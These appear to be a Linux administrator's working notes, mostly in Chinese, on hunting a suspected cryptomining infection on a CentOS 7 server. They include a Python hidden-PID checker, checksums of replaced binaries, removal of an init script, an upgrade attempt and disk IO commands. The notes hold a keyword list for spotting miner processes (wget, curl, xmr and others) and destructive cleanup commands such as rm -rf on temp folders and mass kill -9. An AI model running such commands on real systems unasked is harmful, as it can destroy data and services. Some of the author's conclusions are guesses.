$ ps -A -o stat,ppid,pid,user,uid,cmd | grep "^[Zz]" | wc
    694    4858   38650

$ ps -A -o stat,ppid,pid,%cpu,user,uid,cmd | grep "^[Zz]" | grep root
Z    117578 117581  0.0 root         0 [iscsid] <defunct>
Z    117575 117637  0.0 root         0 [systemd-logind] <defunct>
Z    117575 118525  0.0 root         0 [systemd-logind] <defunct>
Z    117664 118783  0.0 root         0 [crond] <defunct>
Z    117664 119848  0.0 root         0 [crond] <defunct>
...


$ ps -A -o stat,ppid,pid,user,uid,cmd | grep "^[Zz]" | awk '{print $4}' | sort | uniq -c | sort -k1nr
   1523 qin
    327 root
     55 wangjl
     42 chengww
      5 caow
      5 dbus
      5 wxf
      3 zhoub
      2 alamin
      1 huangcy
      1 wangxf
#

# id qin
uid=1003(qin) gid=1003(jin) groups=1003(jin)

# id qin2
uid=1002(qin2) gid=1002(jin2) groups=1002(jin2)

# id qinpf
uid=1038(qinpf) gid=1038(qinpf) groups=1038(qinpf)












(4) 再看进程数
$ mv ~/busybox ~/bin
$ busybox ps -A -o stat,ppid,pid,user,comm | wc
   1994    9973   76859
$ ps -A -o stat,ppid,pid,user,comm | wc
   1919    9878   79947

使用py脚本，检测不一致的命令
$ python3
Python 3.7.3 (default, Mar 27 2019, 22:11:17) 
[GCC 7.3.0] :: Anaconda, Inc. on linux

还是写成脚本吧
$ vim unhide_pid.py
import subprocess,re

(status1, output1)=subprocess.getstatusoutput('busybox ps -A -o stat,ppid,pid,user,comm')
(status2, output2)=subprocess.getstatusoutput('ps -A -o stat,ppid,pid,user,comm')
print('#status1 = ', status1) #0
print('#status2 = ', status2) #0

#分割字符串为文件名
arr1=re.split("\n", output1) #2442
arr2=re.split("\n", output2) #2353
print("#len1=", len(arr1))
print("#len2=", len(arr2))

arr1[0]

a2=[]
for i in range(1, len(arr2)):
  a2.append( re.split("\s+",arr2[i])[2] )

only_In_a1 = []
for i in range(1, len(arr1)):
  pid = re.split("\s+",arr1[i])[2]
  if pid not in a2:
    only_In_a1.append( int(pid) )

len(only_In_a1) #96


rs=[]
for i in range(1, len(arr1)):
  pid=re.split("\s+",arr1[i])[2]
  if int(pid) in only_In_a1:
    rs.append(arr1[i])

len(rs)

print(arr1[0])
for i in rs:
  print(i)


$ python3 unhide_pid.py | grep -v '^#' | grep "^[Zz]" | head
Z     5493  5522 root     (rngd)  #随机数生成器
Z     6631  6965 root     libvirtd
Z     6631  6993 root     libvirtd
Z    17726 17793 root     sshd
Z    17726 17802 root     sshd
...
Z    121825 124618 root     anacron

猜测: 所以这三个是重点了，ssh 用于登陆，libvirtd 提供虚拟化环境，anacron 用于定期任务的执行。


运行以下命令以显示增加的熵级别
$ cat /proc/sys/kernel/random/entropy_avail
3741




这几个进程在新 centos7 系统也有：
$ ps -aux | grep libvirt 
root       6631  0.0  0.0 1023960 21624 ?       Ssl  May09   0:07 /usr/sbin/libvirtd
nobody     7627  0.0  0.0  62708  1364 ?        S    May09   0:00 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/libexec/libvirt_leaseshelper
root       7628  0.0  0.0  62680   428 ?        S    May09   0:00 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/libexec/libvirt_leaseshelper


杀掉这些进程
$ python3 unhide_pid.py | grep -v '^#' | grep "^[Zz]" | wc

$ python3 unhide_pid.py | grep -v '^#' | grep "^[Zz]" | awk '{print $2}' | sort | uniq | sudo xargs kill -9
$ python3 unhide_pid.py | grep -v '^#' | grep "^[Zz]" | awk '{print $3}' | sort | uniq | sudo xargs kill -9 
kill: sending signal to 313618 failed: No such process
kill: sending signal to 313665 failed: No such process
kill: sending signal to 313752 failed: No such process
kill: sending signal to 313760 failed: No such process

$ python3 unhide_pid.py | grep -v '^#' | grep "^[Zz]" 
Z    314124 314202 root     libvirtd

$ sudo kill -9 314124

过了一会，又产生了几个：
$ python3 unhide_pid.py | grep -v '^#' | grep "^[Zz]" 
Z    314474 314547 root     libvirtd
Z    314474 314551 root     libvirtd
Z    315259 315330 root     sshd
Z    315259 315337 root     sshd
Z    316268 316335 root     sshd
Z    316268 316342 root     sshd
Z    322480 322548 root     sshd
Z    322480 322555 root     sshd

https://www.ibm.com/docs/en/zos/2.2.0?topic=provider-start-stop-cim-server


新系统也有这个:
$ ps -aux | grep sleep
wangjl   327045  0.0  0.0 123688  1220 pts/7    S+   16:37   0:00 grep --color=auto sleep
root     327054  0.0  0.0 118928   820 ?        S    16:37   0:00 sleep 60


新安装 centOS 上也有:
$ ps -aux | grep dnsmasq
nobody     7627  0.0  0.0  62708  1364 ?        S    May09   0:00 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/libexec/libvirt_leaseshelper
root       7628  0.0  0.0  62680   428 ?        S    May09   0:00 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/libexec/libvirt_leaseshelper



查看主目录的文件详情， 不要忘记查看隐藏文件。
$ sudo ls -ltha /root
total 190M
-rw-------.  1 root  root   21K May 11 18:15 .bash_history
-rw-------   1 root  root  7.0K May 11 17:06 .viminfo
drwx------.  2 root  root    77 May 11 10:39 .ssh             #可疑
-rw-------.  1 root  root  190M May  6 14:01 core.230809
-rw-------.  1 root  root     0 Nov 19 16:40 .Xauthority
drwx------. 16 root  root  4.0K Nov 19 16:40 .cache          #可疑
-rw-------.  1 root  root  2.8K Nov 19 16:38 .ICEauthority
-rw-------.  1 root  root  1.0K Nov 19 16:31 .rnd
drwx------.  2 root  root     6 Nov 17 20:14 .gvfs
-rw-r--r--.  1 root  root   574 Apr 29  2021 .bashrc


历史命令:
yum install clamav  clamav-server clamav-data clamav-update clamav-filesystem clamav-scanner-systemd clamav-devel clamav-lib clamav-server-systemd pcre* gcc zlib zlib-devel libssl-devel libssl openssl












(5) ss、netstat、ps、lsof 命令被替换为病毒文件，需要将原文件删掉，再将纯净的文件放进去。
存在如curl、wget等下载进程，反复下载病毒文件
定时任务 /var/spool/cron/root 被反复创建，杀不干净
删不干净肯定是有恶意进程在守护，先把可疑进程杀掉

关键字关联可疑进程：sh、wget、curl、xmr、mine、ssh
找到父进程，结束整个进程树


中病毒机器: 
$ md5sum /usr/bin/ps
d24f543e423ccda41d95f02cd26f289d  /usr/bin/ps
a0c32dd6d3bc4d364380e2e65fe9ac64  /usr/bin/ls
73549d6bea3d87e93eea3f169d0db5f0  /usr/bin/top
6610ab31b21d9b5941da4a70ef78a57b  /usr/bin/kill
eca5cbbfa505d58b414e8a4abdc96ca9  /usr/bin/wget
5a34f7eeeef28f66817c4ce6e19875df  /usr/bin/curl
5dd77ae17cfb18c674ec4de905776bde  /usr/bin/netstat
3ee4e2c4f4b70db44e97e201a28db95a  /usr/sbin/ss
34365de21185d6298e9d7eaa9b06068a  /usr/sbin/lsof



新装的系统:
$ md5sum /usr/bin/ps
7e20c61405e25702e08b83478d0ef76f  /usr/bin/ps
a0c32dd6d3bc4d364380e2e65fe9ac64  /usr/bin/ls  #一致
48381853a5aa117164ed13441508d620  /usr/bin/top
931155fa5effd1d7cf7d68ea942cac9d  /usr/bin/kill
eca5cbbfa505d58b414e8a4abdc96ca9  /usr/bin/wget #一致
5dd77ae17cfb18c674ec4de905776bde  /usr/bin/netstat #一致
22a42b3731d77989a1d5fe5d5dbea53d  /usr/sbin/ss
34365de21185d6298e9d7eaa9b06068a  /usr/sbin/lsof #一致


$ sudo mv /usr/bin/ps  /usr/bin/ps-backup









(6) 查看 /etc/rc.local 用户下面的开机自启动
$ ls -lth /etc/rc.local
lrwxrwxrwx. 1 root root 13 Oct  5  2020 /etc/rc.local -> rc.d/rc.local

$ ls -lth /etc/rc.d/rc.local
-rw-r--r--. 1 root root 473 Aug  7  2020 /etc/rc.d/rc.local


$ ls -lth /etc/init.d/
total 48K
-rw-r--r--. 1 root root 1.2K Aug  7  2020 README  ##
-rwxr-xr-x. 1 root root 2.7K Apr  1  2020 multipathd
-rw-r--r--. 1 root root  18K Aug 19  2019 functions  ##
-rwxr-xr-x. 1 root root 4.5K Aug 19  2019 netconsole ##
-rwxr-xr-x. 1 root root 7.8K Aug 19  2019 network  ##
-rwxrwxr-x. 1 root root 1007 May 14  2018 phserver #重点怀疑对象。最后删了。


$ /etc/init.d/phserver --version
Usage: /etc/init.d/phserver {start|stop}



$ cat /etc/rc.d/rc.local 
#!/bin/bash
# THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES
#
# It is highly advisable to create own systemd services or udev rules
# to run scripts during boot instead of using this file.
#
# In contrast to previous versions due to parallel execution during boot
# this script will NOT be run after all other services.
#
# Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure
# that this script will be executed during boot.

touch /var/lock/subsys/local



$ ls /etc/rc*.d/
/etc/rc0.d/:
K50netconsole  K80phserver  K90network

/etc/rc1.d/:
K50netconsole  K80phserver  K90network


$ cat /etc/init.d/phserver
#!/bin/bash
#
# Use for Open peanuthull DDNS 3.0
#
# chkconfig: 2345 80 80
# description:  will be start phddns with system reboot 
#
# processname: phddns

# source function library
. /etc/rc.d/init.d/functions

ORAYSL=/usr/sbin/oraysl
ORAYNEWPH=/usr/sbin/oraynewph
PHDAEMON=/usr/sbin/phdaemon
RETVAL=0
start()
{
	echo -n $"Starting phddns : "
	$ORAYSL -a 127.0.0.1 -p 16062 -s phsle02.oray.net:6061 -l /var/log/phddns -L oraysl -f /etc -S /etc/oray/phddns -t /etc/init.status -i /tmp/oraysl.pid -u /tmp/oraysl.status -d >/dev/null 2>&1 
        $ORAYNEWPH -s 0.0.0.0 -c /var/log/phddns/core.log -p /var/log/phddns -l oraynewph -f /etc -t /etc/init.status -i /tmp/oraynewph.pid -u /tmp/oraynewph.status -x -d >/dev/null 2>&1 
	$PHDAEMON  >/dev/null  2>&1 &
	echo 
}

stop()
{
	echo -n $"Stop phddns : "
	killproc $ORAYSL	
	killproc $ORAYNEWPH
	killproc $PHDAEMON
	echo "uninstall..."
}

case "$1" in
	start)
		start
		;;
	stop)
		stop
		;;
	*)
		echo $"Usage: $0 {start|stop}"
		RETVAL=1
esac
exit $RETVAL





$ ls -lth /etc/rc0.d/K80phserver
lrwxrwxrwx. 1 root root 18 Dec 26  2018 /etc/rc0.d/K80phserver -> ../init.d/phserver
$ ls /etc/init.d/phserver #又指向了上一个文件。


删除掉
$ sudo rm /etc/init.d/phserver

$ sudo rm /etc/rc0.d/K80phserver
$ sudo rm /etc/rc1.d/K80phserver

$ sudo rm /etc/rc2.d/S80phserver
$ sudo rm /etc/rc3.d/S80phserver
$ sudo rm /etc/rc4.d/S80phserver
$ sudo rm /etc/rc5.d/S80phserver

$ sudo rm /etc/rc6.d/K80phserver




$ ls /etc/rc*.d/
/etc/rc0.d/:
K50netconsole  K90network

/etc/rc1.d/:
K50netconsole  K90network

/etc/rc2.d/:
K50netconsole  S10network

/etc/rc3.d/:
K50netconsole  S10network

/etc/rc4.d/:
K50netconsole  S10network

/etc/rc5.d/:
K50netconsole  S10network

/etc/rc6.d/:
K50netconsole  K90network

/etc/rc.d/:
init.d  rc0.d  rc1.d  rc2.d  rc3.d  rc4.d  rc5.d  rc6.d  rc.local



# 测试防火墙拦截端口
$ python3 -m http.server 16062

端口封上 $ sudo iptables -I INPUT -p tcp --dport 16062 -j DROP

#设置iptables开机启动
$ systemctl enable iptables.service
#开启防火墙
$ systemctl start iptables.service
#查看状态
$ systemctl status iptables.service




$ less /etc/init.d/README
Use "systemctl list-unit-files" to get a listing of all known unit files, including stopped, disabled and masked ones. 
Use "systemctl start foobar.service" and "systemctl stop foobar.service" to start or stop a service, respectively. 
For further details, please refer to systemctl(1).












(7) 查看网卡流量

## 异常 大主机
$ ifconfig
enp46s0f0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.5.193  netmask 255.255.255.0  broadcast 172.18.5.255
        inet6 fe80::b696:91ff:fe31:4084  prefixlen 64  scopeid 0x20<link>
        ether b4:96:91:31:40:84  txqueuelen 1000  (Ethernet)
        RX packets 289559166  bytes 390811072877 (363.9 GiB) 
        RX errors 0  dropped 0  overruns 16957  frame 0
        TX packets 167007499  bytes 211512432321 (196.9 GiB) # 197G 流量


## 正常 小主机
$ ifconfig
em1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.20.57.27  netmask 255.255.128.0  broadcast 10.20.127.255
        inet6 fe80::7a29:7b2a:73a1:b387  prefixlen 64  scopeid 0x20<link>
        inet6 2001:da8:201d:1101:9af9:649a:b953:a51a  prefixlen 128  scopeid 0x0<global>
        ether 18:66:da:9d:59:d2  txqueuelen 1000  (Ethernet)
        RX packets 2343249  bytes 2420798813 (2.2 GiB) 
        RX errors 0  dropped 8  overruns 0  frame 0
        TX packets 828847  bytes 157538715 (150.2 MiB) #150M 流量




(8) .systemd开头的文件，这个文件就是挖矿的文件

# find /tmp | grep "systemd"
/tmp/systemd-private-e6255ef0e80f4a839fe65e1d9f933152-cups.service-8qIIiD
/tmp/systemd-private-e6255ef0e80f4a839fe65e1d9f933152-cups.service-8qIIiD/tmp
/tmp/systemd-private-e6255ef0e80f4a839fe65e1d9f933152-chronyd.service-G5DxEl
/tmp/systemd-private-e6255ef0e80f4a839fe65e1d9f933152-chronyd.service-G5DxEl/tmp
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/dct/data/schema/cim_systemdevice.xml




(9)
# rm -rf /tmp/.X11-unix
执行命令rm -rf /tmp/.X11-unix，这个文件夹里的据推测是自动启动病毒文件的目录 （这一步非常重要）



(10)
$ ps -aux | grep crypto
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root       1001  0.0  0.0      0     0 ?        S<   May09   0:00 [crypto]

$ ps -A -o stat,ppid,pid,user,uid,cmd | grep crypto
STAT   PPID    PID USER       UID CMD
S<        2   1001 root         0 [crypto]


$ sudo find /tmp | grep crypto
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/libcrypto.so
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/libcrypto.so.1.0.0
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/lib/libcrypto.so.1.0.





(11) 继续看僵尸进程
$ ps -A -o stat,ppid,pid,%cpu,user,uid,cmd | grep "^[Zz]" | wc
    254    2032   15617
$ ps -A -o stat,ppid,pid,%cpu,user,uid,cmd | grep "^[Zz]" | awk '{print $5}' | sort | uniq -c | sort -k1nr                                                                                                       
    191 root
     41 wangjl
      9 alamin
      9 dbus
      6 caow

$ ps -A -o stat,ppid,pid,%cpu,user,uid,cmd | grep "^[Zz]" | grep root | awk '{print $7}' | sort | uniq -c | sort -k1nr                                                                                           
    105 [systemd-logind]
     84 [crond]
      1 [iscsid]
      1 [run-parts]


$ ps -A -o stat,ppid,pid,%cpu,user,uid,cmd | grep "^[Zz]" | less
Z    416197  36826  0.0 root         0 [crond] <defunct>  
Z    415705  36169  0.0 root         0 [systemd-logind] <defunct>
Z    415706 415709  0.0 root         0 [iscsid] <defunct>
root主要的动作就是: 定时任务，登录。



$ ps -A -o stat,ppid,pid,%cpu,user,uid,cmd | grep "iscsid"
S<Ls      1 415706  0.0 root         0 /sbin/iscsid -f


首先查看下systemd-logind的pid
$ systemctl status systemd-logind.service 
. systemd-logind.service - Login Service
   Loaded: loaded (/usr/lib/systemd/system/systemd-logind.service; static; vendor preset: disabled)
   Active: active (running) since Thu 2022-05-12 11:11:26 CST; 10h ago
     Docs: man:systemd-logind.service(8)
           man:logind.conf(5)
           http://www.freedesktop.org/wiki/Software/systemd/logind
           http://www.freedesktop.org/wiki/Software/systemd/multiseat
 Main PID: 415705 (systemd-logind)
   Status: "Processing requests..."
    Tasks: 106
   Memory: 568.0K
   CGroup: /system.slice/systemd-logind.service
           └─415705 /usr/lib/systemd/systemd-logind

接着通过strace -p pid 进行跟踪
$ sudo strace -p 415705
strace: Process 415705 attached                                                                                                                                                                                                     
epoll_wait(4, [{EPOLLIN, {u32=1151277696, u64=94176899177088}}], 22, -1) = 1
clock_gettime(CLOCK_BOOTTIME, {tv_sec=278795, tv_nsec=947666702}) = 0                                                                                                                                                               
recvmsg(12, {msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="l\4\1\1\37\0\0\0\220\1\0\0\211\0\0\0\1\1o\0\25\0\0\0", iov_len=24}], msg_iovlen=1, msg_controllen=0, msg_flags=MSG_CMSG_CLOEXEC}, MSG_DONTWAIT|MSG_NOSIGNAL|MSG_CMSG_C
LOEXEC) = 24
recvmsg(12, {msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="/org/freedesktop/DBus\0\0\0\2\1s\0\24\0\0\0"..., iov_len=167}], msg_iovlen=1, msg_controllen=0, msg_flags=MSG_CMSG_CLOEXEC}, MSG_DONTWAIT|MSG_NOSIGNAL|MSG_CMSG_CLOEXE
C) = 167
epoll_wait(4, [{EPOLLIN, {u32=1151277696, u64=94176899177088}}], 22, -1) = 1



发现登录过程中，就是调用 /run/systemd/users 下面的文件 ???
我们看下/run/systemd/users/0 文件中存储的内容

$ cat /run/systemd/users/0
# This is private data. Do not parse.
NAME=root
STATE=closing
RUNTIME=/run/user/0
SLICE=user-0.slice
DISPLAY=c4
REALTIME=1652328061699429
MONOTONIC=243356918412
SESSIONS=c4 237 684
SEATS=
ACTIVE_SESSIONS=c4 237 684
ONLINE_SESSIONS=
ACTIVE_SEATS=
ONLINE_SEATS=

记录了用户id为0也就是root用户的session信息，这里发现活动的session很多，但是我登录用户只登录了一个会话

因为每一个session都会创建一个slice，通过slice查看，先查看系统slice
$ systemctl -t slice

然后查看user.0.silce
$ systemctl status user-0.slice -l
[{EPOLLIN, {u32=1151277696, u64=94176899177088}}], 21, -1) = 1
clock_gettime(CLOCK_BOOTTIME, {tv_sec=279386, tv_nsec=264915518}) = 0
recvmsg(12, {msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="l\4\1\1\37\0\0\0\260\1\0\0\211\0\0\0\1\1o\0\25\0\0\0", iov_len=24}], msg_iovlen=1, msg_controllen=0, msg_flags=MSG_CMSG_CLOEXEC}, MSG_DONTWAIT|MSG_NOSIGNAL|MSG_CMSG_CLOEXEC) = 24
recvmsg(12, {msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="/org/freedesktop/DBus\0\0\0\2\1s\0\24\0\0\0"..., iov_len=167}], msg_iovlen=1, msg_controllen=0, msg_flags=MSG_CMSG_CLOEXEC}, MSG_DONTWAIT|MSG_NOSIGNAL|MSG_CMSG_CLOEXEC) = 167
epoll_wait(4, . user-0.slice - User Slice of root
   Loaded: loaded (/run/systemd/system/user-0.slice; static; vendor preset: disabled)
  Drop-In: /run/systemd/system/user-0.slice.d
           └─50-After-systemd-logind\x2eservice.conf, 50-After-systemd-user-sessions\x2eservice.conf, 50-Description.conf, 50-TasksMax.conf
   Active: active since Thu 2022-05-12 12:01:01 CST; 10h ago
   CGroup: /user.slice/user-0.slice
           ├─session-237.scope
           │ └─51325 strace -p 415705
           └─session-684.scope
             └─421759 /usr/sbin/anacron -s
[{EPOLLIN, {u32=1151277696, u64=94176899177088}}], 21, -1) = 1
...








(12) 继续追踪隐藏的进程

$ python3 ~/unhide_pid.py | grep -v "^#" |head
STAT PPID  PID   USER     COMMAND
Z    11166 11233 root     sshd
Z    11166 11238 root     sshd
Z    11166 11240 root     sshd
Z    11166 11245 root     sshd
Z    11166 11246 root     sshd
Z    28677 28744 root     sshd
Z    28677 28749 root     sshd
Z    28677 28750 root     sshd
Z    42693 42761 root     sshd
...


$ busybox top
421759     1 root     S     131m   0% 169   0% /usr/sbin/anacron -s
121475     1 root     S     130m   0%  74   0% /usr/sbin/lvmetad -f



STAT PPID  PID   USER     COMMAND
Z     1878  1898 root     lvmetad
Z     6099  6133 root     libvirtd
Z     6167  6335 root     X
Z     6167  6337 root     X

$ ps 6167
6167 tty1     Ssl+   0:02 /usr/bin/X :0 -background none -noreset -audit 4 -verbose -auth /run/gdm/auth-for-gdm-zazcvq/database -seat seat0 -nolisten tcp vt1










(13) 有人说是 dbus 版本问题
$ service dbus status
Redirecting to /bin/systemctl status dbus.service
● dbus.service - D-Bus System Message Bus
   Loaded: loaded (/usr/lib/systemd/system/dbus.service; static; vendor preset: disabled)
   Active: active (running) since Thu 2022-05-12 11:11:26 CST; 1 day 4h ago
...

$ dbus-launch --version
D-Bus Message Bus Launcher 1.13.2
Copyright (C) 2003 Red Hat, Inc.
...









https://www.qiqios.cn/696.html
$ sudo systemctl stop systemd-logind && sudo rm /run/systemd/sessions/* -rf && sudo systemctl start systemd-logind










ref: 
转：Linux常见挖矿病毒查杀 https://blog.csdn.net/allway2/article/details/106872151





========================================
升级内核为 CentOS7.9
----------------------------------------
1. 升级前
$ uname -sr
Linux 3.10.0-1062.18.1.el7.x86_64

$ cat /etc/centos-release
CentOS Linux release 7.8.2003 (Core)




2. 升级系统
(1) 清理
$ yum clean all #清除缓存
$ yum makecache fast #重新建立缓存


(2) 升级
$ sudo yum update -y #升级系统
...
Transaction test succeeded
Running transaction
** Found 3 pre-existing rpmdb problem(s), 'yum check' output follows:
centos-release-7-9.2009.1.el7.centos.x86_64 is a duplicate with centos-release-7-8.2003.0.el7.centos.x86_64
1:grub2-common-2.02-0.87.el7.centos.7.noarch is a duplicate with 1:grub2-common-2.02-0.81.el7.centos.noarch
iptables-1.4.21-35.el7.x86_64 is a duplicate with iptables-1.4.21-34.el7.x86_64
  Updating   : 1:control-center-filesystem-3.28.1-8.el7_9.x86_64           1/1304 
Segmentation fault

升级失败，说有重复的包。


(3) 解决这个 重复 报错
http://www.javashuo.com/article/p-xbeisoos-v.html
1) 须要安装yum-util
$ suod yum install yum-utils -y
失败，报错同上。
先跳过。

2) 清除yum缓存code
$ suod yum clean all

3) 列出重复的包ip
$ suod package-cleanup --dupes

4) 删除重复的包rem
$ suod package-cleanup --cleandupes --removenewestdupes

Loaded plugins: fastestmirror, langpacks, priorities                                                                                                                                                                                                                                                  
There are unfinished transactions remaining. You might consider running yum-complete-transaction, or "yum-complete-transaction --cleanup-only" and "yum history redo last", first to finish them. If those don't work you'll have to try removing/installing packages by hand (maybe package-cleanup can help).

Erasing 几个包，又安装了几个包。


5) 清除可能存在的损坏包
$ sudo package-cleanup --problems

6) 继续升级
$ sudo yum update -y
需要下载 661 个包。

下载完开始安装时报错:
Transaction test succeeded
Running transaction
  Updating   : 1:grub2-common-2.02-0.87.el7.centos.7.noarch            1/1310 
Segmentation fault


单独更新这一个包呢?
$ sudo yum update grub2-common



(4) 重启系统
$ sudo reboot













========================================
|-- 查找异常网络端口/定时任务 //todo
----------------------------------------

# netstat -tulpn  	## To output numerical service sockets
# netstat -tulp      	## To output literal service sockets


$ sudo netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      6466/sshd           
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      6465/cupsd          
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      5406/rserver        
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      7592/master         
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      6467/smbd           
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      6467/smbd           
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      7627/dnsmasq        
tcp6       0      0 :::22                   :::*                    LISTEN      6466/sshd           
tcp6       0      0 ::1:631                 :::*                    LISTEN      6465/cupsd          
tcp6       0      0 ::1:25                  :::*                    LISTEN      7592/master         
tcp6       0      0 :::445                  :::*                    LISTEN      6467/smbd           
tcp6       0      0 :::2463                 :::*                    LISTEN      5645/java           
tcp6       0      0 127.0.0.1:41667         :::*                    LISTEN      5645/java           
tcp6       0      0 :::139                  :::*                    LISTEN      6467/smbd           
tcp6       0      0 :::21                   :::*                    LISTEN      6470/vsftpd         
udp        0      0 0.0.0.0:59012           0.0.0.0:*                           117606/avahi-daemon 
udp        0      0 192.168.122.1:53        0.0.0.0:*                           7627/dnsmasq        
udp        0      0 0.0.0.0:67              0.0.0.0:*                           7627/dnsmasq        
udp        0      0 127.0.0.1:323           0.0.0.0:*                           5503/chronyd        
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           117606/avahi-daemon 
udp6       0      0 :::47414                :::*                                5645/java           
udp6       0      0 :::50342                :::*                                5629/java           
udp6       0      0 ::1:323                 :::*                                5503/chronyd        
udp6       0      0 :::2463                 :::*                                5645/java           


tcp        0      0 127.0.0.1:6010          0.0.0.0:*               LISTEN      138077/sshd: huangc 
tcp        0      0 127.0.0.1:6011          0.0.0.0:*               LISTEN      17811/sshd: zhouwg@ 
tcp        0      0 127.0.0.1:6012          0.0.0.0:*               LISTEN      205136/sshd: zhoub@ 
tcp        0      0 127.0.0.1:6013          0.0.0.0:*               LISTEN      19595/sshd: huangcy 
tcp        0      0 127.0.0.1:6014          0.0.0.0:*               LISTEN      256590/sshd: zhouwg 
tcp        0      0 127.0.0.1:6015          0.0.0.0:*               LISTEN      267106/sshd: qin@pt 
tcp6       0      0 ::1:6010                :::*                    LISTEN      138077/sshd: huangc 
tcp6       0      0 ::1:6011                :::*                    LISTEN      17811/sshd: zhouwg@ 
tcp6       0      0 ::1:6012                :::*                    LISTEN      205136/sshd: zhoub@ 
tcp6       0      0 ::1:6013                :::*                    LISTEN      19595/sshd: huangcy 
tcp6       0      0 ::1:6014                :::*                    LISTEN      256590/sshd: zhouwg 
tcp6       0      0 ::1:6015                :::*                    LISTEN      267106/sshd: qin@pt 


ref:https://www.tecmint.com/remove-unwanted-services-in-centos-7/

$ sudo service smb stop


$ sudo netstat -tulpn | grep -v sshd



(2) 把可疑的ip加入黑名单
$ sudo iptables -I INPUT -s xx.xx.xx. -j DROP
















2. 查看定时任务:
$ sudo cat /etc/anacrontab
# /etc/anacrontab: configuration file for anacron
# See anacron(8) and anacrontab(5) for details.
SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
# the maximal random delay added to the base delay of the jobs
RANDOM_DELAY=45
# the jobs will be started during the following hours only
START_HOURS_RANGE=3-22

#period in days   delay in minutes   job-identifier   command
1	5	cron.daily		nice run-parts /etc/cron.daily
7	25	cron.weekly		nice run-parts /etc/cron.weekly
@monthly 45	cron.monthly		nice run-parts /etc/cron.monthly



$ sudo cat /etc/cron.d/sysstat 
# Run system activity accounting tool every 10 minutes
*/10 * * * * root /usr/lib64/sa/sa1 1 1
# 0 * * * * root /usr/lib64/sa/sa1 600 6 &
# Generate a daily summary of process accounting at 23:53
53 23 * * * root /usr/lib64/sa/sa2 -A



(2) 
$ sudo ls -lth /var/spool/cron
total 12K
-rw-------. 1 root root  77 Apr  8  2021 root
-rw-------. 1 root root   1 Feb  1  2021 wangw
-rw-------. 1 caow jinwf 42 May 24  2019 caow



$ sudo ls -lth /etc/cron.d/
total 16K
-rw-------. 1 root root 235 Apr  1  2020 sysstat
-rw-r--r--. 1 root root 108 Nov 28  2019 raid-check
-rw-r--r--. 1 root root 128 Aug  9  2019 0hourly
-rw-r--r--. 1 root root  50 Aug  3  2017 0unixdb









========================================
Linux如何查看与测试磁盘IO性能
----------------------------------------

1.查看磁盘IO性能

(1) top 命令

top 命令通过查看 CPU 的 wa% 值来判断当前磁盘 IO 性能，如果这个数值过大，很可能是磁盘 IO 太高了，当然也可能是其他原因，例如网络 IO 过高等。


(2)  sar 命令
sar 命令查看当前磁盘性能的命令为：sar -d -p12

$ sar -d -p 12
Linux 3.10.0-1062.18.1.el7.x86_64 (bio_svr1) 	05/11/2022 	_x86_64_	(192 CPU)

10:16:23 PM       DEV       tps  rd_sec/s  wr_sec/s  avgrq-sz  avgqu-sz     await     svctm     %util
10:16:35 PM       sda      1.00      0.00      8.00      8.00      0.00      0.00      0.00      0.00
10:16:35 PM       sdb      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00
10:16:35 PM       sdc      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00
10:16:35 PM       sdd      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00
10:16:35 PM    mpatha      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00
10:16:35 PM centos-home      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00
10:16:35 PM   mpatha1      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00
10:16:35 PM       sde      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00

10:16:35 PM       DEV       tps  rd_sec/s  wr_sec/s  avgrq-sz  avgqu-sz     await     svctm     %util
10:16:47 PM       sda      1.00      0.00      8.00      8.00      0.00      0.00      0.00      0.00
10:16:47 PM       sdb      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00
10:16:47 PM       sdc      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00
10:16:47 PM       sdd      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00
10:16:47 PM    mpatha      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00
10:16:47 PM centos-home      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00
10:16:47 PM   mpatha1      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00
